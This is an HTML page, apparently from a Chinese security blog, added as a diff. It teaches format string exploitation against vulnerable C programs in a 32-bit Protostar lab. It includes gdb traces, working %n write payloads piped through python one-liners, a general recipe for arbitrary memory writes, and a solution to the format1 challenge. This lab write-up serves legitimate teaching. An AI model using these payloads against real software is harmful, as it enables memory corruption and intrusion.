@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html>
+
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+<title>格式化串漏洞</title>
+<meta name="description" content="A blog about programming and network security">
+
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="stylesheet" href="/css/my_code.css">
+<!-- below font-awesome.css can not be replaced by local file,error will occur -->
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+
+<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">
+
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/favicons/manifest.json">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
+<!-- <script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script> -->
+
+
+
+
+
+
+
+<!-- add zoom.js --> 
+<link href="/css/zoom.css" rel="stylesheet">
+<script src="/js/jquery-1.11.0.min.js"></script>
+<script src="/js/zoom.js"></script>
+<script src="/js/transition.js"></script>
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p style="font-family: 'Great Vibes', cursive;">quanyechavshuo</p>
+
+
+    
+    <center style="margin-top:180%">
+    <font color="red" align="center"><i class="fa fa-link" aria-hidden="true"></i><a href="../../../../../bookmarks.html"><font color="red"> link</font></a></font>
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html" target="_top"><font color="red"> book</font></a></font>
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-caret-square-o-right" aria-hidden="true"></i><a href="../../../../../mv.html" target="_top"><font color="red"> movie</font></a></font>
+    </center>
+    <p class="links">
+  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
+
+      <h1 class="header" itemprop="name">格式化串漏洞</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">June 26, 2016</span>
+           under 二进制
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          3 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><h3 id="0x01-结论知识">0x01 结论知识</h3>
+
+<p>1&gt;printf(“%x”)</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("%x"):未进入printf函数前,第一个栈里的值
+</code></pre>
+</div>
+
+<p>2&gt;printf(“%8x”)</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("%8x"):第一个栈里的值,最后输出到终端为8个字符长度的值(eg.12345678)
+</code></pre>
+</div>
+
+<p>3&gt;<code class="highlighter-rouge">printf("%3\$x")</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("%3\$x"):第三个栈里的值(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")来达到同样的目的)
+宽度格式符(%3)中的%和3是不分开的,如果%3后面加了\$(直接参数访问)则表示为打印第3个栈里的值
+</code></pre>
+</div>
+
+<p>4&gt;<code class="highlighter-rouge">printf("%3\$n")</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("AAAA%3\$n"):将4(4个A)写入第三个栈里的值指向的内存空间(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")),也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
+</code></pre>
+</div>
+
+<h3 id="0x02-原理理解">0x02 原理理解</h3>
+
+<h4 id="1refer">1&gt;refer</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>https://drops.wooyun.org/binary/7714
+https://drops.wooyun.org/papers/9426
+</code></pre>
+</div>
+
+<h4 id="2c代码">2&gt;c代码</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>假设文件名为md.c
+------------md.c----------------
+#include &lt;stdio.h&gt;
+int main(void)
+{ 
+    int flag = 0;
+    int *p = &amp;flag; 
+    char a[100];
+    scanf("%s",a);
+    printf(a);
+
+    if(flag == 2000)
+    {
+        printf("good!!\n");
+    }
+
+    return 0;
+}
+-------------end----------------
+</code></pre>
+</div>
+
+<h4 id="3栈空间">3&gt;栈空间</h4>
+
+<p><a href="https://www.cplusplus.com/reference/cstdio/printf/">printf函数</a><br />
+int printf ( const char * format, …  )</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>第一个参数为格式化串参数,后面可以有参数,也可以没有参数,printf只有一个参数时,cpu会把栈空间里的第一个参数(格式化串参数)后面的栈单元当作是printf的后续参数,因为cpu笨
+
+一般在栈空间里,形如"%8xaaa%8d%n"的字符串参数会存放在某个地方,而在栈中printf的第一个参数char *format一般是这个字符串("%8xaaa%8d%n")的地址,这个栈单元下面(高地址)的栈单元中存放的值是被cpu当作的后续参数,eg:
+
+printf("%8xaaa%8d%n")在栈中的数据如下:
+    printf_ebp(printf函数帧中的第一句push的ebp)
+    printf_retn(printf函数的返回地址)
+    addr_of_"%8xaaa%8d%n"(栈中第一个参数)
+    0x11111111(将成为栈中第二个参数)
+    0x22222222(将成为栈中第三个参数)
+    0x33333333(将成为栈中第三个参数)
+    ...(将成为栈中第四个参数)
+    ...(...)
+
+上面的printf调用后将产生这样的效果:
+    1.在屏幕上打印出:11111111aaa572662306(其中十六进制0x22222222对应十进制572662306),也即从printf的第二个参数开始打印或写入到对应地址
+    2.向地址为0x33333333的内存中写入19(8+3+8=19)
+
+后来发现这是windows中的情况,kalix64中栈中第一个参数的位置存放的不再是字符串"%8xaaa%8d%n"地址,而是字符串本身
+
+上面的2中的c代码对应的栈中分配的情况如下图format所示:
+</code></pre>
+</div>
+<p>图format
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/format.png" /></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>后来才发现的上图是在win7x64位系统上用od跟踪绘制的结果图,在linux中,并不是这样的情况,linux中a[100]在linux中的栈空间中存放的位置会分配在p上面,而不是flag下面,且win7x64系统中,visual studio编译时会失败,强制用od加载并在调用printf时改写栈中format为含有%n的格式化串(eg.%10x%n)同样会异常失败,无法实现"写"
+
+因此,这个实验更适合在linux下进行,且kalix64中的情况与https://drops.wooyun.org/papers/9426中的情况不一样,将md.c复制到protostar(32位)系统中进行实验
+
+scp /root/桌面/md.c user@192.168.3.221:/tmp
+pass:user
+cd /tmp
+gcc -g -o md md.c
+gdb md
+disas /m main
+------output:-------
+8           printf(a);
+0x08048482 &lt;main+46&gt;:   lea    0x14(%esp),%eax
+0x08048486 &lt;main+50&gt;:   mov    %eax,(%esp)
+0x08048489 &lt;main+53&gt;:   call   0x8048364 &lt;printf@plt&gt;
+---------end--------
+b*main+53
+r
+input:AAAA%x.%x.%x
+x/20x $esp
+-----output:------
+0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
+0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
+0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
+0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
+0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
+------end---------
+根据上面windows下od跟踪绘出的图容易知道,0xbffff6e0处存放的为字符串"AAAA%x.%x.%x"的内存地址,也即0xbffff6e0处存放的为printf的第一个参数,0xbffff6e4为第二个参数,以此下推
+
+按照上面图format的理解易知程序运行完后将在屏幕上打印出:AAAAbffff6f4.080481dc.bffff778(从printf的第二个参数开始打印)
+
+如果scanf输入的是:AAAA%x.%x.%x.%x.%x,那么最后一个输出的地址将是41414141,因为printf的第六个参数是41414141,从第二个参数到第六个参数共5个栈单元大小
+
+再次分析此linux系统(protostar)中的变量在栈中存放的具体情况,如下
+disas main
+--------output:--------
+   │0x8048454 &lt;main&gt;                push   %ebp                                                                                                                                                                   │
+   │0x8048455 &lt;main+1&gt;              mov    %esp,%ebp                                                                                                                                                              │
+   │0x8048457 &lt;main+3&gt;              and    $0xfffffff0,%esp                                                                                                                                                       │
+   │0x804845a &lt;main+6&gt;              add    $0xffffff80,%esp                                                                                                                                                       │
+   │0x804845d &lt;main+9&gt;              movl   $0x0,0x78(%esp)                                                                                                                                                        │
+   │0x8048465 &lt;main+17&gt;             lea    0x78(%esp),%eax                                                                                                                                                        │
+   │0x8048469 &lt;main+21&gt;             mov    %eax,0x7c(%esp)                                                                                                                                                        │
+   │0x804846d &lt;main+25&gt;             mov    $0x8048570,%eax                                                                                                                                                        │
+   │0x8048472 &lt;main+30&gt;             lea    0x14(%esp),%edx                                                                                                                                                        │
+   │0x8048476 &lt;main+34&gt;             mov    %edx,0x4(%esp)                                                                                                                                                         │
+   │0x804847a &lt;main+38&gt;             mov    %eax,(%esp)                                                                                                                                                            │
+   │0x804847d &lt;main+41&gt;             call   0x8048374 &lt;__isoc99_scanf@plt&gt;                                                                                                                                         │
+   │0x8048482 &lt;main+46&gt;             lea    0x14(%esp),%eax                                                                                                                                                        │
+   │0x8048486 &lt;main+50&gt;             mov    %eax,(%esp)                                                                                                                                                            │
+B+&gt;│0x8048489 &lt;main+53&gt;             call   0x8048364 &lt;printf@plt&gt; 
+-----------end---------
+main+9处为将flag(flag为0)存放到esp+0x78里面,也即esp+0x78处存放flag
+main+21处为将esp+0x78的值(flag所在的地址)放入到esp+0x7c中,也即flag+7c存放flag的地址
+形如:
+
+        --------
+addr1      0         addr1=esp+0x78,flag被赋值为0
+        --------
+         addr1       esp+0x7c处存放p,p被赋值为flag的地址
+        --------
+
+flag和p在栈中存放的位置情况与windows中的实验完全相反,linux中是flag存放在p的上面,而win7x64中是flag存放在p的下面
+
+在main+21处下断,用来查看esp+0x78的值,也即addr1的值,然后addr1+4即为p存放的地址,算出p存放的地址与printf第二个参数的地址相差多少,就可以知道如何安排format(%n的合适安排)来达到改变p指向的内容的值的目的,也即将一个值写入[p],相当于intel风格汇编语句mov [p],something
+
+q
+gdb md
+disas main
+-------------output:--------------
+0x08048454 &lt;main+0&gt;:    push   %ebp
+0x08048455 &lt;main+1&gt;:    mov    %esp,%ebp
+0x08048457 &lt;main+3&gt;:    and    $0xfffffff0,%esp
+0x0804845a &lt;main+6&gt;:    add    $0xffffff80,%esp
+0x0804845d &lt;main+9&gt;:    movl   $0x0,0x78(%esp)
+0x08048465 &lt;main+17&gt;:   lea    0x78(%esp),%eax
+0x08048469 &lt;main+21&gt;:   mov    %eax,0x7c(%esp)
+---------------end----------------
+b*main+21
+r
+p/x $eax
+-----output:-------
+$3 = 0xbffff758,也即0xbffff758处存放的为flag,addr1=0xbfff758
+-------end---------
+disas main
+-------------output:----------------
+0x0804847d &lt;main+41&gt;:   call   0x8048374 &lt;__isoc99_scanf@plt&gt;
+0x08048482 &lt;main+46&gt;:   lea    0x14(%esp),%eax
+0x08048486 &lt;main+50&gt;:   mov    %eax,(%esp)
+0x08048489 &lt;main+53&gt;:   call   0x8048364 &lt;printf@plt&gt;
+---------------end------------------
+b*main+53
+c
+input:AAAA%x.%x.%x
+x/40x $esp
+------------output:-----------------
+0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
+0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
+0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
+0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
+0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
+0xbffff730:     0xb7ff1040      0x08049668      0xbffff768      0x080484d9
+0xbffff740:     0xb7fd8304      0xb7fd7ff4      0x080484c0      0xbffff768
+0xbffff750:     0xb7ec6365      0xb7ff1040      0x00000000      0xbffff758
+0xbffff760:     0x080484c0      0x00000000      0xbffff7e8      0xb7eadc76
+0xbffff770:     0x00000001      0xbffff814      0xbffff81c      0xb7fe1848
+---------------end------------------
+同样可以看到0xbffff758处存放的0即为flag的值,而0xbfff75c处存放的为p,要实现将0xbffff75c处的0xbffff758指向的内容修改为2000,也即要实现0xbffff75c处,[0xbffff758]=2000
+
+0xbffff75c与printf的第二个参数的地址0xbffff6e4相差0xbffff75c-0xbffff6e4=0x78=30个栈单元大小,也即flag为printf的第31个参数,p为printf的第32个参数
+
+所以要将第32个参数指向的内容修改为2000,这样就可以实现将第31个参数修改为2000
+
+构造"%x"*30+%n,其中前面30个%x中要输出2000个长度,可以通过修改宽度输出大小实现,eg.%1768x+"%x"*29+%n(1768+29*8=2000)
+
+第六个参数为开始存放scanf由终端输入的格式化字符串,第32个参数的数据为重要的不能被scanf由终端输入覆盖的位置,所以输入最多可以输入第6到第31个参数所占的空间大小,共32-6+1=27个栈单元大小=27*4=108个字节
+
+如果由scanf从终端输入超过108个字节的格式化字符串,第109到112个字节将覆盖printf的第32个参数,这样printf执行完以后会将2000写入到109-112个字节被覆盖的值的地址空间中,所以如果输入超过108个字节也可以,但是必须保证输入的第109-112个字节为printf第32个参数原本的值,如果直接将printf第31个参数覆盖成2000,会在printf执行完以后被%n的作用改写成其他值,所以直接在printf的第31个参数位置输入2000是不行的
+
+最好的办法是输入长度不超过108个字节,如
+%1768x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n
+
+但是发现这样不会打印出good,gdb尝试打印发现是在printf打印的时候,如果%x对应的要打印的最高位为0,将被省略去这个"0",所以改成下面的形式,强制8位对应每个%x
+
+%1768x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n(93个字节&lt;108个字节)
+成功打印出good,实现了将flag修改为2000,这样在aslr开启的时候同样有效,因为这里用的是相对偏移
+
+在aslr没有开启时,为了进一步缩短scanf由终端输入的格式化字符串长度的大小(小于108即可),达到精确打击,直接改写printf的第32个参数指向的内存空间的值(也即实现修改flag),可以这样做:
+
+在scanf由终端输入的格式化字符串的开头写上printf的第32个参数的值,也即p的值,也即flag存放的地址
+scanf由终端输入:"0xbffff758"(对应printf第6个参数)+%8x(读第2个参数)+%8x(读第3个参数)+%8x(读第4个参数)+%1972x(读第5个参数)+%n(写进第6个参数指向的内存空间)
+也即'\x58\xf7\xff\xbf'%8x%8x%8x%1972x%n
+其中4+8*3+1972=2000
+但是0xbffff758是gdb调试时候的第32个参数的值,与md单独运行时并不相同,需要找出md直接运行时的printf的第32个参数的值替换即可
+
+scanf由终端输入%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAA%x(31个%x)
+
+最后第31个AA%x处对应输出为:AAbffff788,也即实际运行时printf的第32个参数为0xbffff788
+
+也可以通过https://drops.wooyun.org/papers/9426中查看printf第2个参数的值+(第32个参数与第2个参数相减的差)的方法来计算出第32个参数的大小
+
+构造:'\x88\xf7\xff\xbf'%8x%8x%8x%1972x%n
+python -c "print '\x88\xf7\xff\xbf'+'%8x%8x%8x%1972x%n'" | ./md
+成功修改了flag的值为2000,打印出了good!
+
+或者更短一些,利用%5\$n(直接参数访问)直接写入到printf第六个参数中
+也即:
+'\x88\xf7\xff\xbf'%1996x%5\$n
+
+python -c "print '\x88\xf7\xff\xbf'+'%1996x%5\$n'" | ./md
+成功修改了flag的值为2000,打印出了good!
+
+</code></pre>
+</div>
+
+<h3 id="0x03-提炼方法">0x03 提炼方法</h3>
+
+<p>环境:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>x32系统下,在call printf这一句汇编语句执行前
+</code></pre>
+</div>
+
+<h4 id="方法1精确打击在0x12345678地址中写入0x40404040">方法1&gt;精确打击:在0x12345678地址中写入0x40404040</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>(适用aslr关闭)
+1&gt;输入python -c "print 'AAAABBBB'+'%8x'*20"
+
+    0.输入python -c "print '%3\$x'"查看是否支持\$
+    
+    1.如果20个栈单元中还没有4141414142424242出现,再将20变大,直到可以看到4141414142424242
+    
+    2.也可以先用gdb加载,在main函数帧中的call printf那一句下断点,然后x/20x $esp,看不到则将20变大,直到可以看到
+    
+    3.计算出AAAABBBB(人工构造的格式化串的起始位置)的出现位置为第几个打印值,假设为第num个,便可知道AAAABBBB的出现位置在
+      栈中相当于第num个printf的参数的位置,便可得到AAAABBBB在栈中的位置与printf的第一个参数的位移差为(num-1)*4
+      (第一个参数为人工构造的格式化串"AAAABBBB%x%x...%x"的指针)
+    
+    4.有时候遇到栈中4141414142424242的位置会随着输入的长度的不同而变化,这时可以在保证输入的长度不变的基础下调整输入的
+      形式(也即调整%x和%n的位置).
+
+2&gt;构造python -c "print 'AA\x78\x56\x34\x12BB'+'%(value-4)x'+'%(num)\$n'"
+
+    这里假设在栈中某一单元中,内容为42424141,也即刚好是AAAABBBB中的中间4个字符覆盖了该栈单元的内容
+    value为需要在0x12345678地址中写入的值0x40404040,value-8=1077952568,假设AAAABBBB中的AABB的出现位置为第6个打印数
+    的位置,也即num=6,则构造如下:
+    
+    python -c "print 'AA\x78\x56\x34\x12BB'+'%1077952568x'+'%5\$n'"
+    
+    如果不支持\$则用:
+    python -c "print 'AA\x78\x56\x34\x12BB'+'%1077952565x'+'%1x'*3+'%n'"
+
+</code></pre>
+</div>
+
+<h4 id="方法2动态打击在0x1234568中写入0x40404040">方法2&gt;动态打击:在0x1234568中写入0x40404040</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>(适用于可找到某一栈单元内容为0x12345678的情况,找不到的情况用方法1,该方法可用于aslr开启下)
+
+0&gt;输入python -c "print '%3\$x'"查看是否支持\$
+
+1&gt;找到0x12345678在栈中的位置,用方法1中的两种方法都可以查找(但是如果不是0x12345678这样的比较有特征的可以一眼看出来的,
+  eg.0x40528315,如果需要在栈中查找0x40528315,od中有这个功能,gdb暂不知道,可在使用%x打印栈中数据后尝试用tmux的vim复制
+  模式搜索)
+
+  计算0x12345678在栈中的位置为printf的第几个参数的位置,假设为第32个,也即第31个打印值
+
+2&gt;构造python -c "print '%(value1)x'+'%8x'*29+'%n'"
+      其中value1=1077952576(0x40404040的十进制值)-29*8=1077952344,如下:
+      %1077952344x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n
+  或更短的(需要\$支持):
+      python -c "print '%(value1)x'+'%31\$n'"
+      %1077952576x%31\$n
+
+3&gt;如果不能在栈中某一单元中找到0x12345678而是在连续两个栈单元中存在,eg:
+    --------
+    56341200
+    --------
+    56498078
+    --------
+  这样可以尝试更改输入使0x12345678刚好出现在一个栈中,eg.输入:
+  python -c "print 'B%(value1)x'+'%8x'*29+'%n'"
+  但这不一定有效
+</code></pre>
+</div>
+
+<h3 id="0x04-小试牛刀">0x04 小试牛刀</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>target:
+https://exploit-exercises.com/protostar/format1/
+
+source:
+--------------format1.c-----------------
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void vuln(char *string)
+{
+  printf(string);
+  
+  if(target) {
+      printf("you have modified the target :)\n");
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+}
+-----------------end--------------------
+
+mykey:
+        objdump -t format1
+        find target address:0x8049638
+        ./format1 `python -c "print 'AAAABBBB'+'%x.%x'"`
+        -------------output:--------------
+        AAAABBBB804960c.bffff788
+        --------------end-----------------
+        ./format1 `python -c "print 'AAAABBBB'+'%2\$x'"`
+        ----------------output:----------------
+        AAAABBBB
+        ------------------end------------------
+        结论:这里不能用\$
+        ./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`
+        ---------------output:----------------
+        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7be.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.d5f4313f.ffa7a72f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b4.bffff7be.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.d3000000.e844f82d.2820150f.79187f9d.69c015e8.363836.0.6f662f2e.74616d72.41410031.42424141.78254242.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+        ------------------end-----------------
+        find 42424141 in the 132th print location
+        -----------------output:----------------
+        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7bb.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.b3c0b28e.9993249e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b1.bffff7bb.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.84000000.a999d71b.1ef8a615.f39ada32.69642dc2.363836.662f2e00.616d726f.41003174.42414141.25424242.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
+        --------------------end-----------------
+        find 42414141 in the 131th print location
+        结论:AAAABBBB的在栈中出现的位置会随着输入的长度不同而变化
+        根据./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`中132个输出为42424141:
+        ./format1 `python -c "print 'AA\x38\x96\x04\x08BB'+'%x.'*131+'%n.'+'%x.'*8"`
+        output:
+        .....you have modified the target :)
+</code></pre>
+</div>
+
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            格式化串, format
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+
+
+<!-- 个人增加织网背景效果 -->
+<!--
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+-->
+
+
+      
+
+
+
+      
+
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-12">
+		  <!--for better experience please install font 文泉驿等宽正黑-->
+Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
+	<SCRIPT language=javascript> 
+	<!-- 
+	function show_date_time(){ 
+		window.setTimeout("show_date_time()", 1000); 
+		BirthDay=new Date("3/7/2016 20:00:00");
+		today=new Date(); 
+		timeold=(today.getTime() - BirthDay.getTime()); 
+		sectimeold=timeold/1000 
+		secondsold=Math.floor(sectimeold); 
+		msPerDay=24*60*60*1000 
+		e_daysold=timeold/msPerDay 
+		daysold=Math.floor(e_daysold); 
+		e_hrsold=(e_daysold-daysold)*24; 
+		hrsold=Math.floor(e_hrsold); 
+		e_minsold=(e_hrsold-hrsold)*60; 
+		minsold=Math.floor((e_hrsold-hrsold)*60); 
+		seconds=Math.floor((e_minsold-minsold)*60); 
+		//times = document.getElementById("times");
+		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
+	} 
+	show_date_time(); 
+	//--> 
+	</SCRIPT>
+  </div>
+</div>
+
+<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
+<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
+<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
+<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
+<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>
+
+
+<script src="/js/jquery-1.11.0.min.js"></script>
+<!--
+<script src="/js/bootstrap.min.js"></script>
+-->
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+<!--
+<script type="text/javascript"> 
+$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
+$youziku.draw(); 
+</script>
+-->
+
+
+    </body>
+</html>
